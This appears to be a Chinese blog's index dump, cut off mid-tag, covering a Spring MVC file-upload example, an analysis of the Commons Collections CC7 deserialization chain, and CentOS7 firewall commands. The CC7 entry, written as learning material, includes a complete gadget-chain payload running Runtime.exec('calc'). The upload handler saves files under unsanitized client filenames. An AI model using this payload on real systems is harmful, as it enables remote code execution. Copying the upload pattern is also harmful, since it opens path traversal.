<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-fileupload<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-fileupload<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-io<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-io<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>



<ul>
<li>配置文件上传解析器</li>
</ul>
<p>spring-mvc.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--配置文件上传解析器--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;multipartResolver&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.multipart.commons.CommonsMultipartResolver&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;defaultEncoding&quot;</span> <span class="attr">value</span>=<span class="string">&quot;UTF-8&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;maxUploadSize&quot;</span> <span class="attr">value</span>=<span class="string">&quot;50000&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>



<ul>
<li>编写文件上传代码</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/quick11&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save11</span><span class="params">(String username, MultipartFile uploadFile)</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">        String fileName=uploadFile.getOriginalFilename();</span><br><span class="line">        uploadFile.transferTo(<span class="keyword">new</span> File(<span class="string">&quot;C:\\upload\\&quot;</span>+fileName));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h5 id="多文件上传"><a href="#多文件上传" class="headerlink" title="多文件上传"></a>多文件上传</h5><p>只需要多添加几个type=”file”的表单项,MultipartFile 类型变量名和表单中的name要保持一致</p>
<p>也可以让name都一样,通过同名数组来接收</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://localhost:8080/quick11&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    名称<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span></span><br><span class="line">    文件<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;uploadFiles&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;uploadFiles&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;uploadFiles&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;上传&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/quick11&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save11</span><span class="params">(String username, MultipartFile[] uploadFiles)</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (MultipartFile uploadFile:uploadFiles</span><br><span class="line">             ) &#123;</span><br><span class="line"></span><br><span class="line">            String fileName=uploadFile.getOriginalFilename();</span><br><span class="line">            uploadFile.transferTo(<span class="keyword">new</span> File(<span class="string">&quot;C:\\upload\\&quot;</span>+fileName));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>Spring</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>cc7</title>
    <url>/2022/03/31/cc7/</url>
    <content><![CDATA[<h3 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h3><span id="more"></span>

<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220401002812718.png" alt="image-20220401002812718"></p>
<p>之前的链都是看的别人的讲解,剩的这条链要自己分析一下</p>
<p>后半段依然用的是LazyMap的get方法,</p>
<p><code>AbstractMap.equals</code>方法中调用了get方法</p>
<h5 id="Hashtable"><a href="#Hashtable" class="headerlink" title="Hashtable"></a>Hashtable</h5><p>Hashtable可以理解为线程安全的散列表hashMap</p>
<p>先看Hashtable的序列化过程</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Entry&lt;Object, Object&gt; entryStack = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">synchronized</span> (<span class="keyword">this</span>) &#123;</span><br><span class="line">            <span class="comment">// Write out the length, threshold, loadfactor</span></span><br><span class="line">            s.defaultWriteObject();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Write out length, count of elements</span></span><br><span class="line">            s.writeInt(table.length);<span class="comment">//写入table的容量</span></span><br><span class="line">            s.writeInt(count);<span class="comment">//写入table的元素个数</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// Stack copies of the entries in the table</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> index = <span class="number">0</span>; index &lt; table.length; index++) &#123;</span><br><span class="line">                Entry&lt;?,?&gt; entry = table[index];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span> (entry != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    entryStack =</span><br><span class="line">                        <span class="keyword">new</span> Entry&lt;&gt;(<span class="number">0</span>, entry.key, entry.value, entryStack);</span><br><span class="line">                    entry = entry.next;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Write out the key/value objects from the stacked entries</span></span><br><span class="line">        <span class="keyword">while</span> (entryStack != <span class="keyword">null</span>) &#123;</span><br><span class="line">            s.writeObject(entryStack.key);</span><br><span class="line">            s.writeObject(entryStack.value);</span><br><span class="line">            entryStack = entryStack.next;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">//因为经历了一次入栈和出栈,所以序列化后顺序刚好是反的</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220331000545609.png" alt="image-20220331000545609"></p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220331000314892.png" alt="image-20220331000314892"></p>
<p>使用zkar分析后的确如此,序列化后是反的,但是后面反序列化的时候并没有再反一次让它正过来</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">         <span class="keyword">throws</span> IOException, ClassNotFoundException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// Read in the length, threshold, and loadfactor</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read the original length of the array and number of elements</span></span><br><span class="line">        <span class="keyword">int</span> origlength = s.readInt();</span><br><span class="line">        <span class="keyword">int</span> elements = s.readInt();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Compute new size with a bit of room 5% to grow but</span></span><br><span class="line">        <span class="comment">// no larger than the original size.  Make the length</span></span><br><span class="line">        <span class="comment">// odd if it&#x27;s large enough, this helps distribute the entries.</span></span><br><span class="line">        <span class="comment">// Guard against the length ending up zero, that&#x27;s not valid.</span></span><br><span class="line">        <span class="keyword">int</span> length = (<span class="keyword">int</span>)(elements * loadFactor) + (elements / <span class="number">20</span>) + <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">if</span> (length &gt; elements &amp;&amp; (length &amp; <span class="number">1</span>) == <span class="number">0</span>)</span><br><span class="line">            length--;</span><br><span class="line">        <span class="keyword">if</span> (origlength &gt; <span class="number">0</span> &amp;&amp; length &gt; origlength)</span><br><span class="line">            length = origlength;</span><br><span class="line">        table = <span class="keyword">new</span> Entry&lt;?,?&gt;[length];</span><br><span class="line">        threshold = (<span class="keyword">int</span>)Math.min(length * loadFactor, MAX_ARRAY_SIZE + <span class="number">1</span>);</span><br><span class="line">        count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read the number of elements and then all the key/value objects</span></span><br><span class="line">        <span class="keyword">for</span> (; elements &gt; <span class="number">0</span>; elements--) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                K key = (K)s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                V value = (V)s.readObject();</span><br><span class="line">            <span class="comment">// synch could be eliminated for performance</span></span><br><span class="line">            reconstitutionPut(table, key, value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>readObject方法中,先根据之前写入的两个Int值,计算出需要创建的table的大小,然后创建一个table,然后从反序列化流中依次读取元素并调用<code>reconstitutionPut</code>方法,然后将其中的key和value放入table</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">reconstitutionPut</span><span class="params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> StreamCorruptedException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (value == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> java.io.StreamCorruptedException();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Makes sure the key is not already in the hashtable.</span></span><br><span class="line">        <span class="comment">// This should not happen in deserialized version.</span></span><br><span class="line">        <span class="keyword">int</span> hash = key.hashCode();</span><br><span class="line">        <span class="keyword">int</span> index = (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line">    <span class="comment">//这里利用key的hashcode计算出在hash表中的index</span></span><br><span class="line">        <span class="keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="keyword">null</span> ; e = e.next) &#123;</span><br><span class="line">            <span class="comment">//这里检查已经在index位置上的元素的hash是否与其相等,相等的话则调用equals方法</span></span><br><span class="line">            <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> java.io.StreamCorruptedException();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Creates the new entry.</span></span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">            Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];</span><br><span class="line">        tab[index] = <span class="keyword">new</span> Entry&lt;&gt;(hash, key, value, e);</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>到这里逻辑就基本清楚了,就是送入两个值一样的<code>map</code>,让他们的<code>key</code>在这里触发<code>equals</code>方法,</p>
<blockquote>
<p>来捋一捋调用链的流程</p>
</blockquote>
<p>首先需要满足Hashtable中的两个元素的hashCode相等,那么这里是怎么计算hashCode的呢</p>
<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220331224615938.png" alt="image-20220331224615938" style="zoom:67%;" />

<p>起初tab是空的,反序列化取出第一个元素后才会进入for循环,其中e.hash是第一个元素的hash值,这里的hash来自于key的hashCode,而Hashtable的key是构造好的lazyMap,由于if语句中执行顺序的关系,需要先满足第一个条件才会接着执行下一个条件的语句</p>
<p>由于此时求得是lazyMap的hashCode,所以直接去看lazyMap的hashCode方法,但是lazyMap没有hashCode方法,找到它继承的抽象父类<code>AbstractMapDecorator</code>里面有hashCode方法,和equls一样,它也调用的是当前map的方法</p>
<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220331225017982.png" alt="image-20220331225017982" style="zoom:67%;" />

<p>由于map实际上是<code>HashMap</code>类型的,所以直接去看<code>HashMap</code>的<code>hashCode</code>,它里面也没有<code>hashCode</code>方法,在它的抽象父类<code>AbstractMap</code>中找到了<code>hashCode</code>方法</p>
<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220331225222273.png" alt="image-20220331225222273" style="zoom:67%;" />

<p>这里的i.next().hashCode调用了Object的hashCode分别计算key和value的hash并做异或</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> Objects.hashCode(key) ^ Objects.hashCode(value);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>Object的hashCode方法只要传入的参数不为null,则调用该参数自身的hashCode</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> o != <span class="keyword">null</span> ? o.hashCode() : <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>对于key来说,也就是String 的hashCode</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       <span class="keyword">int</span> h = hash;</span><br><span class="line">       <span class="keyword">if</span> (h == <span class="number">0</span> &amp;&amp; value.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">           <span class="keyword">char</span> val[] = value;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; value.length; i++) &#123;</span><br><span class="line">               h = <span class="number">31</span> * h + val[i];</span><br><span class="line">           &#125;</span><br><span class="line">           hash = h;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> h;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>而value Integer类型的hashCode函数则返回其本身</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">(<span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>根据String计算hashCode的方式编写找hashCode相等的字符串的脚本:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="comment">#获取全部字母的数组</span></span><br><span class="line">letter=string.ascii_letters</span><br><span class="line"><span class="built_in">print</span>(letter)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hashCode</span>(<span class="params"><span class="built_in">str</span></span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">31</span>*<span class="built_in">ord</span>(<span class="built_in">str</span>[<span class="number">0</span>])+<span class="built_in">ord</span>(<span class="built_in">str</span>[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#随机组合成两个的字符串</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> letter:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> letter:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> letter:</span><br><span class="line">            <span class="keyword">for</span> l <span class="keyword">in</span> letter:</span><br><span class="line">                str1=i+j</span><br><span class="line">                str2=k+l</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (str1!=str2 <span class="keyword">and</span> hashCode(str1)==hashCode(str2)):</span><br><span class="line">                    <span class="built_in">print</span>(str1+<span class="string">&quot;  hash===  &quot;</span>+str2)</span><br></pre></td></tr></table></figure>

<p>首先通过Hashtable的readObject触发<code>Hashtable.reconstitutionPut</code>,由于<code>yy</code>和<code>zZ</code>的hashCode相等,所以触发<code>equals</code>方法,LazyMap是没有equals方法的,但是它继承的抽象类<code>AbstractMapDecorator</code>实现了<code>equals</code>方法</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220331011008494.png" alt="image-20220331011008494"></p>
<p>它只要判断传入的对象不是当前对象,则调用map的equals方法,这里的map就是lazyMap中的map属性,由于起初lazyMap初始化的时候map传递的是<code>HashMap</code>,所以会调用<code>HashMap</code>的<code>equals</code>方法,但是HashMap并没有<code>equals</code>方法,但是它继承的抽象父类<code>AbstractMap</code>有,map属性需要满足3条就可以,<code>1.不是同一对象2.实现了Map接口3.o和当前map 的元素个数相等</code></p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220331011543850.png" alt="image-20220331011543850"></p>
<p>接着就会调用map的get,虽然o被转型为了Map,但是其本质上还是LazyMap,所以这里调用<code>m.get</code>就相当于调用了<code>lazyMap2.get</code>至于这里调用的是第二个lazyMap的get但是为什么key是”yy”而不是”zz”原因还是序列化的时候的那一波出入栈操作<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220331012704699.png" alt="image-20220331012704699"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers= <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer Chainedtransform = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[]&#123;&#125;);</span><br><span class="line">    	<span class="comment">//可以替换为 ... = new ChainedTransformer(new Transformer[]&#123;new ConstantTransformer(0)&#125;);</span></span><br><span class="line"></span><br><span class="line">        Map innerMap1 = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map innerMap2 = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">        Map lazyMap1 = LazyMap.decorate(innerMap1, Chainedtransform);</span><br><span class="line">        Map lazyMap2 = LazyMap.decorate(innerMap2, Chainedtransform);</span><br><span class="line">        lazyMap1.put(<span class="string">&quot;yy&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        lazyMap2.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        Hashtable hashtable = <span class="keyword">new</span> Hashtable();</span><br><span class="line">        hashtable.put(lazyMap1, <span class="number">1</span>);</span><br><span class="line">        hashtable.put(lazyMap2, <span class="number">2</span>);</span><br><span class="line">        lazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;lazyMap1 hashcode:&quot;</span> + lazyMap1.hashCode());</span><br><span class="line">        System.out.println(<span class="string">&quot;lazyMap2 hashcode:&quot;</span> + lazyMap2.hashCode());</span><br><span class="line"></span><br><span class="line">        Class&lt;? extends Transformer&gt; chainedtransformClass = Chainedtransform.getClass();</span><br><span class="line">        Field iTransformers = chainedtransformClass.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        iTransformers.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        iTransformers.set(Chainedtransform,transformers);</span><br><span class="line"></span><br><span class="line">        SerializeTest.serialize(hashtable);</span><br><span class="line">        UnSerializeTest.unserialize(<span class="string">&quot;C:\\Temp\\test.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>









<h5 id="为什么会lazyMap2会多出一个”yy-yy”"><a href="#为什么会lazyMap2会多出一个”yy-yy”" class="headerlink" title="为什么会lazyMap2会多出一个”yy=yy”"></a>为什么会lazyMap2会多出一个”yy=yy”</h5><p>hashTable在put的时候会调用</p>
<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220331180337409.png" alt="image-20220331180337409" style="zoom:80%;" />

<p>entry.key.equals(key),  entry.key是lazyMap1, key也就是lazyMap2,然后会调用到<code>AbstractMap.equals</code>(lazyMap2)</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220331172723005.png" alt="image-20220331172723005"></p>
<p>在里面会调用到lazyMap2的get方法,这里传进去的参数<code>key</code>是第一个lazyMap的key, <code>m</code>代表的是lazyMap2,调用了第二个<code>lazyMap的get(&quot;yy&quot;)</code>,由于<code>&quot;yy&quot;</code>在lazyMap2中不存在,所以会调用<code>ChainedTransformer.transform(&quot;yy&quot;)</code></p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220331173811180.png" alt="image-20220331173811180"></p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220331173729480.png" alt="image-20220331173729480"></p>
<p>由于当前的itransform数组长度为0,所以返回的是”yy”,</p>
<p>接着<code>LazyMap.get</code>方法把传入的key当key,transform(key)得到的值当成value,put一个<code>entry</code>进到lazyMap2里面,也就是”yy=”yy”</p>
<blockquote>
<p>起初为了防止在put的时候就执行代码,我用了<code>ConstantTransformer(1)</code>代替了<code>Tranformer</code>数组,但是出现了put不成功的情况,只能putLazyMap进去,这个问题需要探究一下</p>
</blockquote>
<p>接着上面的分析,最后给下面画红线的地方中equals()中的值就是上面最后transform返回的结果,value是Hashtable中第一个entry的value,也就是1,所以这块是<code>1.equals(  )</code>,只要不是1就满足结果</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220331182218564.png" alt="image-20220331182218564"></p>
<h5 id="为什么要remove"><a href="#为什么要remove" class="headerlink" title="为什么要remove()"></a>为什么要remove()</h5><p>因为在调用到<code>AbstractMap.equals</code>的时候,会判断两个map的长度是否一致,如果不一致则不会进行下面的get调用了</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220331174106161.png" alt="image-20220331174106161"></p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>commons-collections</tag>
      </tags>
  </entry>
  <entry>
    <title>centos7防火墙配置</title>
    <url>/2021/01/13/centos7%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h2 id="CentOS7-防火墙设置"><a href="#CentOS7-防火墙设置" class="headerlink" title="CentOS7 防火墙设置"></a>CentOS7 防火墙设置</h2><p>阿里云centos7中默认使用firewall,并且默认没有开启。</p>
<p>使用阿里云服务器,先要在阿里云后台开放端口,然后关闭centos防火墙或者开放centos的对应端口,只开放centos端口,不设置阿里云端口设置,仍然不能访问!firewall配置</p>
<h4 id="重启、关闭、开启firewalld服务"><a href="#重启、关闭、开启firewalld服务" class="headerlink" title="重启、关闭、开启firewalld服务"></a>重启、关闭、开启firewalld服务</h4><h5 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h5><p>systemctl start firewalld</p>
<h5 id="开机启动"><a href="#开机启动" class="headerlink" title="开机启动"></a>开机启动</h5><p>systemctl enable firewalld</p>
<h5 id="关闭"><a href="#关闭" class="headerlink" title="关闭"></a>关闭</h5><p>systemctl stop firewalld</p>
<h5 id="取消开机启动"><a href="#取消开机启动" class="headerlink" title="取消开机启动"></a>取消开机启动</h5><p>systemctl disable firewalld</p>
<h5 id="重启"><a href="#重启" class="headerlink" title="重启"></a>重启</h5><p>service firewalld restart</p>
<h5 id="查看firewall的状态"><a href="#查看firewall的状态" class="headerlink" title="查看firewall的状态"></a>查看firewall的状态</h5><p>firewall-cmd –state</p>
<h5 id="查看防火墙规则"><a href="#查看防火墙规则" class="headerlink" title="查看防火墙规则"></a>查看防火墙规则</h5><p>firewall-cmd –list-all</p>
<h5 id="用户配置目录"><a href="#用户配置目录" class="headerlink" title="用户配置目录"></a>用户配置目录</h5><p>cd /etc/firewalld/命令行方式</p>
<h5 id="常用的几个端口和配置语句"><a href="#常用的几个端口和配置语句" class="headerlink" title="常用的几个端口和配置语句"></a>常用的几个端口和配置语句</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">**<span class="comment"># web**</span></span><br><span class="line"></span><br><span class="line">firewall-cmd --zone=public --permanent --add-port=80/tcp</span><br><span class="line"></span><br><span class="line">**<span class="comment"># mysql**</span></span><br><span class="line"></span><br><span class="line">firewall-cmd --zone=public --permanent --add-port=3306/tcp</span><br><span class="line"></span><br><span class="line">**<span class="comment"># tomcat**</span></span><br><span class="line"></span><br><span class="line">firewall-cmd --zone=public --permanent --add-port=8080/tcp</span><br><span class="line"></span><br><span class="line">**<span class="comment"># redis**</span></span><br><span class="line"></span><br><span class="line">firewall-cmd --zone=public --permanent --add-port=6379/tcp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">firewall-cmd：是Linux提供的操作firewall的一个工具； –permanent：表示设置为持久； –add-port：标识添加的端口； –zone=public：指定的zone为public；</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="批量添加端口"><a href="#批量添加端口" class="headerlink" title="批量添加端口"></a>批量添加端口</h5><p>firewall-cmd –zone=public –permanent –add-port=8081-8200/tcp</p>
<h5 id="生成的配置文件所在路径"><a href="#生成的配置文件所在路径" class="headerlink" title="生成的配置文件所在路径"></a>生成的配置文件所在路径</h5><p>vi /etc/firewalld/zones/public.xml</p>
<h5 id="配置完成后重启"><a href="#配置完成后重启" class="headerlink" title="配置完成后重启"></a>配置完成后重启</h5><p>service firewalld restart配置文件方式</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><span class="tag">&lt;<span class="name">zone</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">short</span>&gt;</span>Public<span class="tag">&lt;/<span class="name">short</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">description</span>&gt;</span>For use in public areas.<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">rule</span> <span class="attr">family</span>=<span class="string">&quot;ipv4&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">source</span> <span class="attr">address</span>=<span class="string">&quot;122.10.70.234&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">port</span> <span class="attr">protocol</span>=<span class="string">&quot;udp&quot;</span> <span class="attr">port</span>=<span 